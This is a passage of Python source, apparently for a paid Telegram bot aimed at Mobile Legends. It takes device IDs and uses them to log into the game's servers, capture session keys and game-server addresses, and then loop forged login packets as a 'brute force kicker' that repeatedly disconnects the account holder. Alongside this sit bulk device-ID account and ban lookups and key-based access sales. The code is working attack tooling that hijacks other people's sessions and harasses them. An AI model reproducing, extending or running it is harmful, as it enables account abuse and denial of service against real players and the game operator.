            self.port = port
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.settimeout(timeout)
        self.socket.connect((self.host, self.port))

    def cleanup(self):
        if self.socket:
            try:
                self.socket.close()
            except:
                pass
            self.socket = None
            self.sequence = 1

    def send_data(self, pid: int, sdp: SDP):
        pkt = SDP({0: pid, 1: self.sequence, 5: sdp.data}).data
        comp = zstd.compress(pkt)
        flags = (len(comp) + 4) | (16 << 24)
        self.socket.send(flags.to_bytes(4, 'big') + comp)
        self.sequence += 1

    def recv_data(self) -> Tuple[Optional[int], Optional[SDP]]:
        try:
            while len(self.queue) < 4:
                d = self.socket.recv(4096)
                if not d:
                    return None, None
                self.queue += d
            flags = int.from_bytes(self.queue[:4], 'big')
            size = flags & 0xFFFFFF
            ctype = flags >> 24
            while len(self.queue) < size:
                d = self.socket.recv(4096)
                if not d:
                    return None, None
                self.queue += d
            data = self.queue[4:size]
            self.queue = self.queue[size:]
            data = _decode(ctype, data)
            res = SDP(data)
            pid = res.get(0)
            if pid is None:
                return None, None
            body = res.get(6) or res.get(5)
            return (pid, SDP(body)) if body and isinstance(body, bytes) else (pid, None)
        except socket.timeout:
            return -1, None
        except:
            return None, None


def fetch_session_profile(device_id: str) -> Optional[Dict[str, Any]]:
    try:
        conn = BruteForceConnection(device_id)
        conn.connect(LOGIN_HOST, LOGIN_PORT, timeout=5.0)
        raw, md5, aid, adv = parse_device_id(device_id)
        conn.send_data(1, SDP({
            0: raw,
            1: f'gps_adid={adv}&android_id={aid}&device_unique_id={md5}',
            2: CLI_VER, 3: CHANNEL, 4: 'en'
        }))
        pid, res = conn.recv_data()
        if pid != 2 or not res:
            conn.cleanup()
            return None
        conn.account_id = res.get(0)
        conn.session_key = res.get(1)
        zone_data = res.get(2)
        if isinstance(zone_data, dict):
            conn.zone_id = zone_data.get(0, 0)
        elif isinstance(zone_data, list) and len(zone_data) > 0:
            conn.zone_id = zone_data[0] if not isinstance(zone_data[0], dict) else zone_data[0].get(0, 0)
        else:
            conn.zone_id = zone_data or 0
        conn.send_data(5, SDP({
            0: conn.account_id, 1: conn.session_key, 2: CLI_VER, 5: conn.zone_id, 6: CHANNEL
        }))
        pid, res = conn.recv_data()
        if pid != 6 or not res:
            conn.cleanup()
            return None
        gs_addr = res.get(1)
        if not gs_addr or ':' not in str(gs_addr):
            conn.cleanup()
            return None
        conn.game_host, conn.game_port = str(gs_addr).split(':')
        conn.game_port = int(conn.game_port)
        conn.cleanup()
        return {
            'device_id': device_id,
            'account_id': conn.account_id,
            'session_key': conn.session_key,
            'zone_id': conn.zone_id,
            'game_host': conn.game_host,
            'game_port': conn.game_port,
            'gs_info': f"{conn.game_host}:{conn.game_port}",
        }
    except Exception as e:
        return None


def send_session_kick(profile: Dict[str, Any], timeout: float = 3.0) -> Tuple[bool, float, str]:
    t0 = time.time()
    sock = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((profile['game_host'], profile['game_port']))

        body_struct = SDP({
            0: profile['account_id'],
            1: profile['session_key'],
            2: profile['zone_id'],
            4: CLI_VER,
            13: CHANNEL,
            15: profile['device_id']
        }).data

        pkt = SDP({0: 10001, 1: 1, 5: body_struct}).data
        comp = zstd.compress(pkt)
        flags = (len(comp) + 4) | (16 << 24)
        sock.sendall(flags.to_bytes(4, 'big') + comp)

        q = b''
        got_ack = False
        try:
            while len(q) < 4:
                d = sock.recv(4096)
                if not d:
                    break
                q += d
            if len(q) >= 4:
                fl = int.from_bytes(q[:4], 'big')
                sz = fl & 0xFFFFFF
                while len(q) < sz:
                    d = sock.recv(4096)
                    if not d:
                        break
                    q += d
                if len(q) >= sz:
                    got_ack = True
        except socket.timeout:
            pass

        elapsed_ms = (time.time() - t0) * 1000
        sock.close()
        return True, elapsed_ms, ("ACK RECEIVED" if got_ack else "SENT OK")
    except socket.timeout:
        elapsed_ms = (time.time() - t0) * 1000
        if sock:
            try:
                sock.close()
            except:
                pass
        return False, elapsed_ms, "TIMEOUT"
    except Exception as e:
        elapsed_ms = (time.time() - t0) * 1000
        if sock:
            try:
                sock.close()
            except:
                pass
        return False, elapsed_ms, str(e)


def format_profile_card_text(profile: Dict[str, Any]) -> str:
    lines = []
    lines.append("ACCOUNT PROFILE")
    lines.append(f"Account ID    : {profile['account_id']}")
    lines.append(f"Zone ID       : {profile['zone_id']}")
    return "\n".join(lines)


def build_bruteforce_progress_text(session: Dict[str, Any]) -> str:
    profile = session.get('profile', {})
    count = session.get('count', 0)
    success_count = session.get('success_count', 0)
    fail_count = session.get('fail_count', 0)
    last_latency = session.get('last_latency', 0.0)
    total_loops = session.get('total_loops', 0)
    delay_sec = session.get('delay_sec', 0.0)
    mode_label = session.get('mode_label', 'Custom')
    status = session.get('status', 'running')
    loop_str = f"{count}/{total_loops}" if total_loops > 0 else f"{count}/infinite"
    avg_lat = session.get('avg_latency', 0.0)
    succ_pct = (success_count / count * 100) if count > 0 else 0.0
    speed = session.get('speed', 0.0)
    return (
        f"BRUTE FORCE IN PROGRESS\n\n"
        f"Mode        : {mode_label}\n"
        f"Target ID   : {profile.get('account_id', '?')} (Zone {profile.get('zone_id', '?')})\n"
        f"Device      : {str(profile.get('device_id', '?'))[:50]}...\n\n"
        f"Progress    : {loop_str}\n"
        f"Success     : {success_count} ({succ_pct:.1f}%)\n"
        f"Failed      : {fail_count}\n"
        f"Last Latency: {last_latency:.0f}ms\n"
        f"Avg Latency : {avg_lat:.0f}ms\n"
        f"Speed       : {speed:.2f} kick/s\n"
        f"Delay       : {delay_sec}s\n\n"
        f"Status      : {status.upper()}"
    )


def build_bruteforce_summary_text(result: Dict[str, Any]) -> str:
    profile = result['profile']
    stopped_txt = " (STOPPED BY USER)" if result.get('stopped') else ""
    return (
        f"BRUTE FORCE SUMMARY{stopped_txt}\n\n"
        f"Mode        : {result.get('mode_label', 'Custom')}\n"
        f"Target ID   : {profile.get('account_id', '?')} (Zone {profile.get('zone_id', '?')})\n"
        f"Device      : {str(profile.get('device_id', '?'))[:50]}...\n\n"
        f"Duration    : {result['duration']:.1f}s\n"
        f"Total Loops : {result['total_loops']}\n"
        f"Success     : {result['success_count']} ({result['success_percent']:.1f}%)\n"
        f"Failed      : {result['fail_count']}\n"
        f"Avg Latency : {result['avg_latency']:.1f}ms\n"
        f"Speed       : {result['speed']:.2f} kick/s"
    )


def _threadsafe_edit_message(bot_instance, text: str, chat_id: int, message_id: int,
                              reply_markup=None):
    if MAIN_LOOP is None or bot_instance is None:
        return
    try:
        coro = bot_instance.edit_message_text(
            text=text,
            chat_id=chat_id,
            message_id=message_id,
            reply_markup=reply_markup,
        )
        asyncio.run_coroutine_threadsafe(coro, MAIN_LOOP)
    except Exception:
        pass


def _threadsafe_send_message(bot_instance, text: str, chat_id: int,
                              reply_markup=None):
    if MAIN_LOOP is None or bot_instance is None:
        return
    try:
        coro = bot_instance.send_message(
            chat_id=chat_id,
            text=text,
            reply_markup=reply_markup,
        )
        asyncio.run_coroutine_threadsafe(coro, MAIN_LOOP)
    except Exception:
        pass


def run_bruteforce_sync(profile: Dict[str, Any], total_loops: int, delay_sec: float,
                        user_id: int, chat_id: int, message_id: int,
                        stop_event: threading.Event,
                        mode_label: str = "Custom",
                        bot_instance=None) -> Dict[str, Any]:
    count = 0
    success_count = 0
    fail_count = 0
    latencies = []
    start_time = time.time()
    last_edit = 0.0
    log_lines = []

    stop_markup = InlineKeyboardMarkup([
        [InlineKeyboardButton("STOP", callback_data=f"bf_stop_{user_id}")]
    ])

    with bruteforce_lock:
        bruteforce_sessions[user_id] = {
            'user_id': user_id, 'chat_id': chat_id, 'message_id': message_id,
            'profile': profile, 'count': 0, 'success_count': 0, 'fail_count': 0,
            'last_latency': 0.0, 'avg_latency': 0.0, 'speed': 0.0,
            'total_loops': total_loops, 'delay_sec': delay_sec,
            'mode_label': mode_label, 'status': 'running',
            'start_time': start_time, 'stop_event': stop_event,
            'stage': 'running',
        }

    try:
        while True:
            if stop_event.is_set():
                break

            count += 1
            try:
                ok, lat, desc = send_session_kick(profile, timeout=3.0)
            except Exception as e:
                ok, lat, desc = False, 0.0, f"EXC: {str(e)[:50]}"
            latencies.append(lat)

            if ok:
                success_count += 1
            else:
                fail_count += 1

            avg_lat = (sum(latencies) / len(latencies)) if latencies else 0.0
            elapsed_now = time.time() - start_time
            speed = (count / elapsed_now) if elapsed_now > 0 else 0.0

            with bruteforce_lock:
                sess = bruteforce_sessions.get(user_id)
                if sess is not None:
                    sess['count'] = count
                    sess['success_count'] = success_count
                    sess['fail_count'] = fail_count
                    sess['last_latency'] = lat
                    sess['avg_latency'] = avg_lat
                    sess['speed'] = speed

            now = time.time()
            if now - last_edit >= 1.0 or (total_loops > 0 and count >= total_loops):
                last_edit = now
                with bruteforce_lock:
                    sess = bruteforce_sessions.get(user_id)
                if sess:
                    text = build_bruteforce_progress_text(sess)
                    _threadsafe_edit_message(
                        bot_instance, text, chat_id, message_id,
                        reply_markup=stop_markup
                    )

            if count % 10 == 0:
                log_lines.append(f"Loop {count}: OK={success_count}, FAIL={fail_count}, Lat={lat:.0f}ms")

            if total_loops > 0 and count >= total_loops:
                break

            if delay_sec > 0:
                slept = 0.0
                chunk = 0.1
                while slept < delay_sec:
                    if stop_event.is_set():
                        break
                    time.sleep(min(chunk, delay_sec - slept))
                    slept += chunk

    except Exception as e:
        log_lines.append(f"Error: {str(e)}")
        logger.error(f"run_bruteforce_sync error: {e}")

    duration = time.time() - start_time
    avg_lat = (sum(latencies) / len(latencies)) if latencies else 0.0
    succ_pct = (success_count / count * 100) if count > 0 else 0.0
    speed = (count / duration) if duration > 0 else 0.0

    return {
        'total_loops': count, 'success_count': success_count, 'fail_count': fail_count,
        'avg_latency': avg_lat, 'success_percent': succ_pct, 'speed': speed,
        'duration': duration, 'log_lines': log_lines, 'profile': profile,
        'mode_label': mode_label, 'stopped': stop_event.is_set(),
    }


key_manager = KeyManager()

bruteforce_sessions: Dict[int, Dict[str, Any]] = {}
bruteforce_lock = threading.Lock()
bruteforce_user_count: Dict[int, int] = {}


class MLBBBot:
    def __init__(self):
        self.active_tasks = {}
        self.live_stats = {}

    def _is_admin(self, user_id: int) -> bool:
        return user_id in ADMIN_IDS

    def _check_access(self, user_id: int) -> bool:
        return key_manager.has_access(user_id)

    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        context.user_data['mode'] = None
        
        user_id = update.effective_user.id
        has_access = self._check_access(user_id)
        is_admin = self._is_admin(user_id)
        expiry = key_manager.get_expiry(user_id)
        if is_admin:
            status_line = "Role: Admin"
        elif has_access:
            status_line = f"Access until: {expiry}"
        else:
            status_line = "No active access"
        welcome_msg = (
            f"MLBB DEVICE ID CHECKER\n"
            f"==================\n\n"
            f"User: {update.effective_user.first_name}\n"
            f"{status_line}\n\n"
            f"Contact @ZyronDevv to buy access\n"
        )
        keyboard = []
        if has_access or is_admin:
            keyboard.append([InlineKeyboardButton("Bulk Check", callback_data="check_file")])        
            keyboard.append([InlineKeyboardButton("Single Check", callback_data="single_check")])
            keyboard.append([InlineKeyboardButton("Ban Check Only", callback_data="ban_check_only")])
            keyboard.append([InlineKeyboardButton("Creation Date", callback_data="creation_date_only")])
            keyboard.append([InlineKeyboardButton("Brute Force", callback_data="bruteforce")])
        if not has_access and not is_admin:
            welcome_msg += "You need an access key to use this bot.\nUse /redeem <KEY> to activate."
        if is_admin:
            keyboard.append([InlineKeyboardButton("Admin Panel", callback_data="admin_panel")])
        keyboard.append([InlineKeyboardButton("My Status", callback_data="my_status")])
        await update.message.reply_text(welcome_msg, reply_markup=InlineKeyboardMarkup(keyboard))

    async def redeem_cmd(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not context.args:
            await update.message.reply_text("Usage: /redeem <KEY>")
            return
        key = context.args[0].strip()
        ok, msg = key_manager.redeem_key(key, update.effective_user.id)
        await update.message.reply_text(f"{'OK:' if ok else 'ERROR:'} {msg}")

    async def genkey_cmd(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not self._is_admin(update.effective_user.id):
            await update.message.reply_text("Admin only.")
            return
        if not context.args:
            await update.message.reply_text(
                "Usage: /genkey <duration>\n\n"
                "Examples:\n/genkey 1h - 1 hour\n/genkey 7d - 7 days\n"
                "/genkey 1m - 1 month\n/genkey 1y - 1 year\n/genkey 2w - 2 weeks"
            )
            return
        seconds, label = parse_duration(context.args[0])
        if seconds is None:
            await update.message.reply_text("Invalid duration.\nUse: 1h, 7d, 1m, 1y, 2w")
            return
        key = key_manager.generate_key(seconds, label, update.effective_user.id)
        await update.message.reply_text(
            f"Key Generated!\n\nKey: {key}\nDuration: {label}\n\nRedeem: /redeem {key}"
        )

    async def listkeys_cmd(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not self._is_admin(update.effective_user.id):
            await update.message.reply_text("Admin only.")
            return
        keys = key_manager.list_keys(show_used=False)
        if not keys:
            await update.message.reply_text("No unused keys.")
            return
        lines = ["Unused Keys:\n"]
        for k in keys[:20]:
            lines.append(f"{k['key']} - {k['label']}")
        await update.message.reply_text("\n".join(lines))

    async def listusers_cmd(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not self._is_admin(update.effective_user.id):
            await update.message.reply_text("Admin only.")
            return
        users = key_manager.list_users()
        if not users:
            await update.message.reply_text("No users.")
            return
        lines = ["Users:\n"]
        for u in users[:30]:
            status = "ACTIVE" if u["active"] else "EXPIRED"
            lines.append(f"{status} UID: {u['uid']} | Expires: {u['expires']}")
        await update.message.reply_text("\n".join(lines))

    async def revoke_cmd(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not self._is_admin(update.effective_user.id):
            await update.message.reply_text("Admin only.")
            return
        if not context.args:
            await update.message.reply_text("Usage: /revoke <user_id>")
            return
        try:
            target = int(context.args[0])
        except ValueError:
            await update.message.reply_text("Invalid user ID.")
            return
        ok = key_manager.revoke_user(target)
        await update.message.reply_text(f"{'Revoked.' if ok else 'Not found.'}")

    async def delkey_cmd(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not self._is_admin(update.effective_user.id):
            await update.message.reply_text("Admin only.")
            return
        if not context.args:
            await update.message.reply_text("Usage: /delkey <KEY>")
            return
        ok = key_manager.delete_key(context.args[0])
        await update.message.reply_text(f"{'Deleted.' if ok else 'Not found.'}")

    async def help(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        is_admin = self._is_admin(update.effective_user.id)
        help_text = (
            "Commands:\n=========\n\n"
            "/start - Main menu\n/redeem <KEY> - Activate key\n"
            "/single - Single device ID check (full info)\n"
            "/bancheck - Check ban status only \n"
            "/creationdate - Check account creation date \n"
            "/bruteforce - Brute force kicker\n/bfstop - Stop brute force\n"
            "/bfstatus - Brute force status\n/help - Show this\n"
        )
        if is_admin:
            help_text += (
                "\nAdmin:\n=======\n"
                "/genkey <dur> - Generate key\n/listkeys - Unused keys\n"
                "/listusers - All users\n/revoke <uid> - Revoke access\n"
                "/delkey <KEY> - Delete key\n/flush - Backup database\n"
            )
        await update.message.reply_text(help_text)

    async def flush_cmd(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        if not self._is_admin(user_id):
            return
        chat_id = update.effective_chat.id
        status_msg = await update.message.reply_text("Initializing secure vault backup...")
        try:
            if not os.path.exists(DB_DIR) or not os.listdir(DB_DIR):
                await status_msg.edit_text("Database folder is empty. Nothing to back up.")
                return
            zip_filename = f"db_backup_{int(time.time())}.zip"
            zip_filepath = os.path.join(os.getcwd(), zip_filename)
            with zipfile.ZipFile(zip_filepath, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for root, _, files in os.walk(DB_DIR):
                    for file in files:
                        file_path = os.path.join(root, file)
                        zipf.write(file_path, os.path.relpath(file_path, DB_DIR))
            with open(zip_filepath, 'rb') as f:
                await context.bot.send_document(
                    chat_id=chat_id, document=f, filename=zip_filename,
                    caption="SECURE VAULT BACKUP\nHere is your requested database backup archive."
                )
            if os.path.exists(zip_filepath):
                os.remove(zip_filepath)
            await status_msg.edit_text(
                f"DATABASE SECURE DUMP\n=================\n\n"
                f"Backup Status: Sent to Admin Chat\n"
                f"Database files: Retained safely in folder\n"
                f"Secure Bot Status: SAFE"
            )
        except Exception as e:
            logger.error(f"Secure backup extraction failed: {e}")
            await status_msg.edit_text(f"Secure dump extraction failed: {str(e)}")

    async def check_file(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        if not self._check_access(user_id):
            await update.callback_query.answer("No access. /redeem <KEY>", show_alert=True)
            return
        if user_id in self.active_tasks and not self.active_tasks[user_id]['done']:
            await update.callback_query.answer("Task running!", show_alert=True)
            return
        await update.callback_query.answer()
        context.user_data['mode'] = 'file'
        await update.callback_query.edit_message_text(
            f"Send .txt file with device IDs (one per line).\n\n"
        )

    async def generate(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        if not self._check_access(user_id):
            await update.callback_query.answer("No access. /redeem <KEY>", show_alert=True)
            return
        if user_id in self.active_tasks and not self.active_tasks[user_id]['done']:
            await update.callback_query.answer("Task running!", show_alert=True)
            return
        await update.callback_query.answer()
        context.user_data['mode'] = 'generate'
        await update.callback_query.edit_message_text(
            f"How many IDs? Send a number (1-50000)\n\n"
        )

    async def my_status(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        await query.answer()
        user_id = query.from_user.id
        is_admin = self._is_admin(user_id)
        expiry = key_manager.get_expiry(user_id)
        has_access = self._check_access(user_id)
        if is_admin:
            status = "Role: Admin (Unlimited)"
        elif has_access:
            status = f"Active until: {expiry}"
        else:
            status = "No access\n/redeem <KEY>"
        await query.edit_message_text(f"My Status\n=========\n\nID: {user_id}\n{status}")

    async def admin_panel(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        if not self._is_admin(query.from_user.id):
            await query.answer("Admin only.", show_alert=True)
            return
        await query.answer()
        keys = key_manager.list_keys(show_used=False)
        users = key_manager.list_users()
        active_users = sum(1 for u in users if u["active"])
        keyboard = [
            [InlineKeyboardButton("Generate Key", callback_data="admin_genkey")],
            [InlineKeyboardButton("List Keys", callback_data="admin_listkeys")],
            [InlineKeyboardButton("List Users", callback_data="admin_listusers")],
            [InlineKeyboardButton("Back", callback_data="back_main")]
        ]
        await query.edit_message_text(
            f"Admin Panel\n===========\n\n"
            f"Unused Keys: {len(keys)}\nTotal Users: {len(users)}\nActive: {active_users}\n\n"
            f"/genkey <dur> | /listkeys | /listusers\n/revoke <uid> | /delkey <key> | /flush",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )

    async def admin_genkey_panel(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        if not self._is_admin(query.from_user.id):
            await query.answer("No", show_alert=True)
            return
        await query.answer()
        keyboard = [
            [InlineKeyboardButton("1 Hour", callback_data="genkey_1h"),
             InlineKeyboardButton("6 Hours", callback_data="genkey_6h"),
             InlineKeyboardButton("12 Hours", callback_data="genkey_12h")],
            [InlineKeyboardButton("1 Day", callback_data="genkey_1d"),
             InlineKeyboardButton("3 Days", callback_data="genkey_3d"),
             InlineKeyboardButton("7 Days", callback_data="genkey_7d")],
            [InlineKeyboardButton("14 Days", callback_data="genkey_14d"),
             InlineKeyboardButton("1 Month", callback_data="genkey_1m"),
             InlineKeyboardButton("3 Months", callback_data="genkey_3m")],
            [InlineKeyboardButton("6 Months", callback_data="genkey_6m"),
             InlineKeyboardButton("1 Year", callback_data="genkey_1y")],
            [InlineKeyboardButton("Back", callback_data="admin_panel")]
        ]
        await query.edit_message_text("Generate Key\nSelect duration:", reply_markup=InlineKeyboardMarkup(keyboard))

    async def admin_listkeys_panel(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        if not self._is_admin(query.from_user.id):
            await query.answer("No", show_alert=True)
            return
        await query.answer()
        keys = key_manager.list_keys(show_used=False)
        if not keys:
            text = "No unused keys."
        else:
            lines = [f"Unused Keys ({len(keys)}):\n"]
            for k in keys[:15]:
                lines.append(f"{k['key']} - {k['label']}")
            text = "\n".join(lines)
        keyboard = [[InlineKeyboardButton("Back", callback_data="admin_panel")]]
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))

    async def admin_listusers_panel(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        if not self._is_admin(query.from_user.id):
            await query.answer("No", show_alert=True)
            return
        await query.answer()
        users = key_manager.list_users()
        if not users:
            text = "No users."
        else:
            lines = [f"Users ({len(users)}):\n"]
            for u in users[:15]:
                s = "ACTIVE" if u["active"] else "EXPIRED"
                lines.append(f"{s} {u['uid']} | {u['expires']}")
            text = "\n".join(lines)
        keyboard = [[InlineKeyboardButton("Back", callback_data="admin_panel")]]
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))

    async def single_check_cmd(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        if not self._check_access(user_id):
            await update.message.reply_text("No access. /redeem <KEY>")
            return
        
        if user_id in self.active_tasks and not self.active_tasks[user_id].get('done', True):
            await update.message.reply_text("You already have a running task. Please wait for it to finish.")
            return
        
        context.user_data['mode'] = 'single'
        
        markup = InlineKeyboardMarkup([
            [InlineKeyboardButton("Cancel", callback_data="cancel_single")]
        ])
        
        await update.message.reply_text(
            "Single Device ID Check\n\n"
            "Send a device ID to check.\n\n"
            "Device ID format: and_a1b2c3d4e5f6...\n\n"
            "Retries up to 20 times, but sends result ASAP once definitive answer is received.",
            reply_markup=markup
        )

    async def single_check_button(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        user_id = query.from_user.id
        if not self._check_access(user_id):
            await query.answer("No access. /redeem <KEY>", show_alert=True)
            return
        
        if user_id in self.active_tasks and not self.active_tasks[user_id].get('done', True):
            await query.answer("Task running! Please wait.", show_alert=True)
            return
        
        await query.answer()
        context.user_data['mode'] = 'single'
        
        markup = InlineKeyboardMarkup([
            [InlineKeyboardButton("Cancel", callback_data="cancel_single")]
        ])
        
        await query.edit_message_text(
            "Single Device ID Check\n\n"
            "Send a device ID to check.\n\n"
            "Device ID format: and_a1b2c3d4e5f6...\n\n"
            "Retries up to 20 times, but sends result ASAP once definitive answer is received.",
            reply_markup=markup
        )

    async def handle_single_check(self, update: Update, context: ContextTypes.DEFAULT_TYPE, device_id: str):
        user_id = update.effective_user.id
        chat_id = update.effective_chat.id
        
        context.user_data['mode'] = None
        
        if not device_id.startswith("and_") and not device_id.startswith("ios_"):
            await update.message.reply_text(
                "Invalid Device ID\n\n"
                "Device ID must start with and_ or ios_"
            )
            return
        
        if len(device_id) < 50:
            await update.message.reply_text(
                f"Invalid Device ID\n\nDevice ID too short ({len(device_id)} chars, minimum 50)."
            )
            return
        
        if any(c.isspace() for c in device_id):
            await update.message.reply_text("Invalid Device ID\n\nNo spaces allowed.")
            return
        
        processing_msg = await update.message.reply_text(
            "Checking device ID...\n\n"
            "Will retry up to 20 times if needed. Once a definitive answer is received, result will be sent immediately."
        )
        
        try:
            loop = asyncio.get_event_loop()
            result = await loop.run_in_executor(
                None, 
                lookup_by_device_id, 
                device_id
            )
            
            full_info = format_full_info_text(device_id, {
                'status': result.get('status', 'unknown'),
                'acc': result.get('account_id'),
                'zone': result.get('zone_id'),
                'player': result.get('player_data'),
                'ban_info': result.get('ban_info', {}),
                'error': result.get('error')
            })
            
            file_content = (
                f"MLBB Device Check Results\n"
                f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
                f"{'=' * 60}\n\n"
                f"{full_info}\n\n"
                f"{'=' * 60}\n"
                f"End of Report"
            )
            
            file_obj = io.BytesIO(file_content.encode('utf-8'))
            file_obj.name = f"MLBB_Device_Info_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
            
            await context.bot.send_document(
                chat_id,
                document=file_obj,
                filename=file_obj.name,
                caption="Device Info"
            )
            
            result_text = format_single_check_result(result)
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            result_text += f"\n\nChecked: {timestamp}"
            
            await context.bot.send_message(chat_id, result_text)
            
            try:
                await processing_msg.delete()
            except Exception:
                pass
            
            logger.info(f"Single check completed for {device_id[:30]}... by user {user_id}")
            
        except Exception as e:
            logger.error(f"Error in single check: {e}")
            try:
                await processing_msg.edit_text(
                    f"Error occurred\n\n{str(e)[:200]}"
                )
            except Exception:
                await context.bot.send_message(chat_id, f"Error: {str(e)[:200]}")

    async def ban_check_only_cmd(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        if not self._check_access(user_id):
            await update.message.reply_text("No access. /redeem <KEY>")
            return
        
        context.user_data['mode'] = 'bancheck'
        
        markup = InlineKeyboardMarkup([
            [InlineKeyboardButton("Cancel", callback_data="cancel_single")]
        ])
        
        await update.message.reply_text(
            "Ban Check Only \n\n"
            "Send a device ID to check ban status.\n\n"
            "Device ID format: and_a1b2c3d4e5f6...\n\n"
            "Retries up to 20 times, sends result ASAP once definitive.",
            reply_markup=markup
        )

    async def ban_check_only_button(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        user_id = query.from_user.id
        if not self._check_access(user_id):
            await query.answer("No access. /redeem <KEY>", show_alert=True)
            return
        
        await query.answer()
        context.user_data['mode'] = 'bancheck'
        
        markup = InlineKeyboardMarkup([
            [InlineKeyboardButton("Cancel", callback_data="cancel_single")]
        ])
        
        await query.edit_message_text(
            "Ban Check Only \n\n"
            "Send a device ID to check ban status.\n\n"
            "Device ID format: and_a1b2c3d4e5f6...\n\n"
            "Retries up to 20 times, sends result ASAP once definitive.",
            reply_markup=markup
        )

    async def handle_ban_check_only(self, update: Update, context: ContextTypes.DEFAULT_TYPE, device_id: str):
        user_id = update.effective_user.id
        chat_id = update.effective_chat.id
        
        context.user_data['mode'] = None
        
        if not device_id.startswith("and_") and not device_id.startswith("ios_"):
            await update.message.reply_text(
                "Invalid Device ID\n\n"
                "Device ID must start with and_ or ios_"
            )
            return
        
        if len(device_id) < 50:
            await update.message.reply_text(
                f"Invalid Device ID\n\nDevice ID too short ({len(device_id)} chars, minimum 50)."
            )
            return
        
        processing_msg = await update.message.reply_text(
            "Checking ban status...\n\n"
            "Will retry up to 20 times if needed. Once a definitive answer is received, result will be sent immediately."
        )
        
        try:
            loop = asyncio.get_event_loop()
            result = await loop.run_in_executor(
                None, 
                check_ban_v2_with_retry, 
                device_id
            )
            
            result_text = format_ban_check_result(result)
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            result_text += f"\n\nChecked: {timestamp}"
            
            await context.bot.send_message(chat_id, result_text)
            
            try:
                await processing_msg.delete()
            except Exception:
                pass
            
            logger.info(f"Ban check completed for {device_id[:30]}... by user {user_id}")
            
        except Exception as e:
            logger.error(f"Error in ban check: {e}")
            try:
                await processing_msg.edit_text(
                    f"Error occurred\n\n{str(e)[:200]}"
                )
            except Exception:
                await context.bot.send_message(chat_id, f"Error: {str(e)[:200]}")

    async def creation_date_cmd(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        if not self._check_access(user_id):
            await update.message.reply_text("No access. /redeem <KEY>")
            return
        
        context.user_data['mode'] = 'creationdate'
        
        markup = InlineKeyboardMarkup([
            [InlineKeyboardButton("Cancel", callback_data="cancel_single")]
        ])
        
        await update.message.reply_text(
            "Check Creation Date Only \n\n"
            "Send a device ID to check account creation date.\n\n"
            "Device ID format: and_a1b2c3d4e5f6...\n\n"
            "only fetches account creation date.\n"
            "No player info.",
            reply_markup=markup
        )

    async def creation_date_button(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        user_id = query.from_user.id
        if not self._check_access(user_id):
            await query.answer("No access. /redeem <KEY>", show_alert=True)
            return
        
        await query.answer()
        context.user_data['mode'] = 'creationdate'
        
        markup = InlineKeyboardMarkup([
            [InlineKeyboardButton("Cancel", callback_data="cancel_single")]
        ])
        
        await query.edit_message_text(
            "Check Creation Date Only \n\n"
            "Send a device ID to check account creation date.\n\n"
            "Device ID format: and_a1b2c3d4e5f6...\n\n"
            "only fetches account creation date.\n"
            "No player info.",
            reply_markup=markup
        )

    async def handle_creation_date_check(self, update: Update, context: ContextTypes.DEFAULT_TYPE, device_id: str):
        user_id = update.effective_user.id
        chat_id = update.effective_chat.id
        
        context.user_data['mode'] = None
        
        if not device_id.startswith("and_") and not device_id.startswith("ios_"):
            await update.message.reply_text(
                "Invalid Device ID\n\n"
                "Device ID must start with and_ or ios_"
            )
            return
        
        if len(device_id) < 50:
            await update.message.reply_text(
                f"Invalid Device ID\n\nDevice ID too short ({len(device_id)} chars, minimum 50)."
            )
            return
        
        processing_msg = await update.message.reply_text(
            "Fetching creation date...\n\n"
            "This is a fast check - please wait..."
        )
        
        try:
            loop = asyncio.get_event_loop()
            result = await loop.run_in_executor(
                None, 
                check_creation_date_sync, 
                device_id
            )
            
            result_text = format_creation_date_result(result)
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            result_text += f"\n\nChecked: {timestamp}"
            
            await context.bot.send_message(chat_id, result_text)
            
            try:
                await processing_msg.delete()
            except Exception:
                pass
            
            logger.info(f"Creation date check completed for {device_id[:30]}... by user {user_id}")
            
        except Exception as e:
            logger.error(f"Error in creation date check: {e}")
            try:
                await processing_msg.edit_text(
                    f"Error occurred\n\n{str(e)[:200]}"
                )
            except Exception:
                await context.bot.send_message(chat_id, f"Error: {str(e)[:200]}")

    async def bruteforce_cmd(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
